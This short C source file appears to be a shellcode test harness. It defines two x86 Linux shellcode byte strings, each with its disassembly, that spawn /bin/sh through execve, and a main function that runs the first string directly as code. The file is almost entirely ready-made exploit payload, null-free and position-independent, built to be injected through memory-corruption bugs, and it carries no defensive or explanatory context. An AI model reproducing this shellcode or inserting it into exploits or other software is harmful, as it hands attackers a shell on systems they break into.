#include <stdio.h>
#include <string.h>

/*  shellcode 1 execve("/bin/sh", {"/bin/sh", NULL}, NULL);
eb 0a                	jmp    c
5b                   	pop    %ebx
53                   	push   %ebx
89 e1                	mov    %esp,%ecx
31 d2                	xor    %edx,%edx
b0 0b                	mov    $0xb,%al
cd 80                	int    $0x80
31 c0                	xor    %eax,%eax
50                   	push   %eax
e8 ee ff ff ff       	call   2 <execv>
*/
char *shellcode1="\xeb\x0a\x5b\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x50\xe8\xee\xff\xff\xff/bin/sh";

/* shellcode 2 execve("/bin/sh", NULL, NULL);
31 c0                	xor    %eax,%eax
50                   	push   %eax
68 6e 2f 73 68       	push   $0x68732f6e
68 2f 2f 62 69       	push   $0x69622f2f
89 e3                	mov    %esp,%ebx
50                   	push   %eax
53                   	push   %ebx
89 e1                	mov    %esp,%ecx
89 c2                	mov    %eax,%edx
b0 0b                	mov    $0xb,%al
cd 80                	int    $0x80
*/

char *shellcode2="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";

int main()
{
   
   (*(void(*)())shellcode1)();
}

